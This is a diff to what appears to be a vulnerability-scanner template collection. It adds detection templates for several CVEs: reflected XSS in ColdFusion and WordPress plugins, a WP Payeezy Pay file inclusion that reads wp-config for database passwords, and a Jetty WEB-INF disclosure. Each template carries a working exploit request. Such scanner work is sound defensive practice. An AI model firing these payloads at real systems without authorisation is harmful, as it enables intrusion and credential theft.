@@ -248,6 +248,48 @@
       ]
     },
     {
+      "id": "CVE-2009-1872",
+      "info": {
+        "author": "princechaddha",
+        "description": "Multiple cross-site scripting (XSS) vulnerabilities in Adobe ColdFusion Server 8.0.1, 8, and earlier allow remote attackers to inject arbitrary web script or HTML via (1) the startRow parameter to administrator/logviewer/searchlog.cfm, or the query string to (2) wizards/common/_logintowizard.cfm, (3) wizards/common/_authenticatewizarduser.cfm, or (4) administrator/enter.cfm.",
+        "name": "Adobe Coldfusion 8 linked XSS vulnerabilies",
+        "reference": "- https://www.securityfocus.com/archive/1/505803/100/0/threaded\n- https://www.tenable.com/cve/CVE-2009-1872\n",
+        "severity": "medium",
+        "tags": "cve,cve2009,adobe,xss,coldfusion"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/CFIDE/wizards/common/_logintowizard.cfm?></script><script>alert(document.domain)</script>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-4223",
       "info": {
         "author": "geeknik",
@@ -2741,6 +2783,90 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/hdw-tube/mychannel.php?channel=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000152",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin tidio-form v1.0",
+        "name": "Tidio-form <= 1.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000152",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/tidio-form/popup-insert-help.php?formId=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000154",
+      "info": {
+        "author": "daffainfo",
+        "description": "Reflected XSS in wordpress plugin whizz v1.0.",
+        "name": "WHIZZ <= 1.0.7 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000154",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -6184,6 +6310,45 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-20985",
+      "info": {
+        "author": "daffainfo",
+        "description": "WordPress Plugin WP Payeezy Pay is prone to a local file inclusion vulnerability because it fails to sufficiently verify user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. WordPress Plugin WP Payeezy Pay version 2.97 is vulnerable; prior versions are also affected.",
+        "name": "WordPress Plugin WP Payeezy Pay 2.97 - Local File Inclusion",
+        "reference": "- https://www.pluginvulnerabilities.com/2018/12/06/our-improved-proactive-monitoring-has-now-caught-a-local-file-inclusion-lfi-vulnerability-as-well/\n- https://www.cvedetails.com/cve/CVE-2018-20985/\n",
+        "severity": "high",
+        "tags": "cve,cve2018,wordpress,lfi"
+      },
+      "requests": [
+        {
+          "body": "x_login=../../../wp-config",
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "The base configuration for WordPress",
+                "define( 'DB_NAME',",
+                "define( 'DB_PASSWORD',"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-payeezy-pay/donate.php"
           ]
         }
       ]
@@ -17525,7 +17690,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<web-app>",
+                "</web-app>",
                 "java.sun.com"
               ]
             },
@@ -17570,7 +17735,7 @@
               "part": "body",
               "type": "word",
               "words": [
-                "<web-app>",
+                "</web-app>",
                 "java.sun.com"
               ]
             },
@@ -18303,6 +18468,51 @@
           "raw": [
             "POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: application/json\nReferer: {{BaseURL}}\nConnection: close\nX-Requested-With: XMLHttpRequest\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.txt\"\nContent-Type: image/png\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n",
             "GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-34429",
+      "info": {
+        "author": "Bernardo Rodrigues @bernardofsr | André Monteiro @am0nt31r0",
+        "description": "For Eclipse Jetty versions 9.4.37-9.4.42, 10.0.1-10.0.5 & 11.0.1-11.0.5, URIs can be crafted using some encoded characters to access the content of the WEB-INF directory and/or bypass some security constraints. This is a variation of the vulnerability reported in CVE-2021-28164/GHSA-v7ff-8wcx-gmc5.\n",
+        "name": "Jetty Authorization Before Parsing and Canonicalization Variation",
+        "reference": "- https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,jetty"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</web-app>",
+                "java.sun.com"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/xml"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%u002e/WEB-INF/web.xml",
+            "{{BaseURL}}/.%00/WEB-INF/web.xml"
           ]
         }
       ]
